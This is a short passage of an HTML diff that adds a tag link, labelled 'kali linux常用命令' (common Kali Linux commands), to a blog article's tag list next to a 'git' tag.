                 <a href="javascript:void(0)" class="js-tag color4">git</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">kali linux常用命令</a>
               </li>
              
               <li class="article-tag-list-item">
